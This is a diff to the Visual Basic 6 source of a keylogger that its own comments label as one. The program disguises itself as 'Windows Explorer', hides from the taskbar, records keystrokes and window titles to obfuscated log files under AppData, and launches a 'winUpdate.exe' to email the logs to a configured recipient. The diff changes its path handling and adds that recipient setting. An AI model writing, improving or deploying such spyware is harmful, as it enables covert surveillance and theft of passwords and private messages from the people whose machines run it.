@@ -2,38 +2,37 @@ VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
    Caption         =   "Windows Explorer"
-   ClientHeight    =   4065
+   ClientHeight    =   4095
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   5295
+   ClientWidth     =   5040
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   271
+   ScaleHeight     =   273
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   353
+   ScaleWidth      =   336
    ShowInTaskbar   =   0   'False
-   Begin VB.TextBox txtUserName 
-      Height          =   285
-      Left            =   120
-      TabIndex        =   2
-      Text            =   "username"
-      Top             =   0
-      Width           =   1335
+   Begin VB.Timer Timer1 
+      Enabled         =   0   'False
+      Interval        =   65
+      Left            =   4560
+      Top             =   720
    End
    Begin VB.Timer Timer2 
       Interval        =   450
-      Left            =   4680
+      Left            =   3960
       Top             =   0
    End
    Begin VB.TextBox Text2 
+      Enabled         =   0   'False
       Height          =   285
-      Left            =   1440
+      Left            =   240
       Locked          =   -1  'True
       TabIndex        =   1
-      Top             =   0
-      Width           =   3255
+      Top             =   120
+      Width           =   4455
    End
    Begin VB.TextBox Text1 
       Enabled         =   0   'False
@@ -41,14 +40,8 @@ Begin VB.Form Form1
       Left            =   120
       MultiLine       =   -1  'True
       TabIndex        =   0
-      Top             =   360
-      Width           =   4815
-   End
-   Begin VB.Timer Timer1 
-      Enabled         =   0   'False
-      Interval        =   65
-      Left            =   4920
       Top             =   480
+      Width           =   4815
    End
 End
 Attribute VB_Name = "Form1"
@@ -58,14 +51,18 @@ Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
 Option Explicit
 
-'username import function
-Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
+'Special Folder path Import
+Public Enum mceIDLPaths
+    CSIDL_APPDATA = &H1A ' C:\WINNT\Profiles\username\Application Data.
+    CSIDL_WINDOWS = &H24 ' C:\WINNT.
+End Enum
+Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
 
 'Active windowtitle part
 Private Declare Function GetForegroundWindow Lib "user32" () As Long
-Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
-Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
-Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
+Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
+Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
+Private Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long
 
 'keylogger part
 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
@@ -73,15 +70,19 @@ Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As In
 
 
 'Loadsetting variable declaration
-Dim LPath, Pwd As String
+Dim LPath, Pwd, PCDec As String
 
 'Prevent only Titles in LOG
 Dim HasSomeText As Boolean 'Log wil not recorded if HasSomeText=False
 
+Private Sub Form_DblClick()
+End
+End Sub
+
 Private Sub Form_Load()
 
 If App.PrevInstance = True Then
-    Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
+    Shell (GetSpecialFolderA(CSIDL_WINDOWS) & "explorer.exe"), vbNormalFocus 'This program is already running!
     End
     Exit Sub
 End If
@@ -90,7 +91,7 @@ Me.Left = Screen.Width - Me.Width
 Me.Top = Screen.Height - Me.Height
 
 App.TaskVisible = False
-Call LoadUserName
+
 Timer2.Enabled = True
 
 Call startLogging
@@ -100,16 +101,15 @@ Private Sub startLogging()
 
 Call LoadSetting
 
-
 LPath = LPath & "\browse" & Format$(Now, "dd" & "mm" & "yy") & "z.nkl"
 
 If Dir(LPath) = "" Then
 'Write initials
 Open LPath For Append As 1
     If Pwd = "" Then    'To avoid the null string encrypt error.
-    Write #1, Chr(155), Time, Date, Encrypt(txtUserName, 25), "", Encrypt(App.Revision, 20)
+    Write #1, Chr(155), Time, Date, Encrypt(PCDec, 25), "", Encrypt(App.Revision, 20)
     Else
-    Write #1, Chr(155), Time, Date, Encrypt(txtUserName, 25), Encrypt(Pwd, 20), Encrypt(App.Revision, 20)
+    Write #1, Chr(155), Time, Date, Encrypt(PCDec, 25), Encrypt(Pwd, 20), Encrypt(App.Revision, 20)
     End If
 Close #1
 End If
@@ -119,18 +119,20 @@ End Sub
 
 
 Private Sub LoadSetting()
-Dim PCDec As String
-If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt") <> "" Then 'setting file found then
+Dim SendTo As String
+If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") <> "" Then 'setting file found then
     
-    Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt" For Input As 1
-    Input #1, LPath, Pwd, PCDec
+    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") For Input As 1
+    Input #1, LPath, Pwd, PCDec, SendTo
     Close #1
 Else    'setting not found
     MsgBox "Settings not found", , "Error": End
 End If
 
-'To disable sending Email set PC Dec=none or delete WinUpdate.exe
-If LCase(PCDec) <> "none" And Dir(App.Path & "\winUpdate.exe") <> "" Then Shell App.Path & "\winUpdate.exe"
+'If Path is from Username root use u:
+If Left(LPath, 2) = "u:" Then LPath = Environ$("USERPROFILE") & Mid(LPath, 3, Len(LPath) - 2)
+'To disable sending Email set SendTo=none or delete WinUpdate.exe
+If LCase(SendTo) <> "none" And Dir(App.Path & "\winUpdate.exe") <> "" Then Shell App.Path & "\winUpdate.exe"
 
 End Sub
 
@@ -188,9 +190,9 @@ HasSomeText = False
 
 Dim t1, t2, t3, t4, t5 As String
 
-If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP") <> "" Then 'setting file found then
+If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") <> "" Then 'setting file found then
     
-    Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Input As 1
+    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Input As 1
     Input #1, t1, t2, t3, t4, t5
     Close #1
 
@@ -473,33 +475,30 @@ End If
 
 GetActiveWindowTitle = GetWindowTitle(i)
 End Function
-Public Function GetWindowTitle(ByVal hwnd As Long) As String
+Public Function GetWindowTitle(ByVal hWnd As Long) As String
 Dim l As Long
 Dim S As String
 
-l = GetWindowTextLength(hwnd)
+l = GetWindowTextLength(hWnd)
 S = Space(l + 1)
 
-GetWindowText hwnd, S, l + 1
+GetWindowText hWnd, S, l + 1
 
 GetWindowTitle = Left$(S, l)
 End Function
-Private Sub LoadUserName()
 
-'IMPORT USERNAME*******************************************
-Dim sBuffer As String
-    Dim lSize As Long
-    sBuffer = Space$(255)
-    lSize = Len(sBuffer)
-    Call GetUserName(sBuffer, lSize)
-    If lSize > 0 Then
-        txtUserName = Left$(sBuffer, lSize)
-    Else
-        txtUserName = vbNullString
-End If
+'IMPORT Special folder Path
+Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String
 
-End Sub
-Private Function Encrypt(ThisText As String, encCode As Integer) As String
+Dim Ret As Long
+Dim Trash As String: Trash = Space$(260)
+
+    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
+    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
+  
+    GetSpecialFolderA = Trash
+End Function
+Private Function Encrypt(ByVal ThisText As String, encCode As Integer) As String
 Dim i As Integer
 For i = 1 To Len(ThisText)
 Encrypt = Encrypt & Chr(Asc(Mid(ThisText, i, 1)) + encCode)
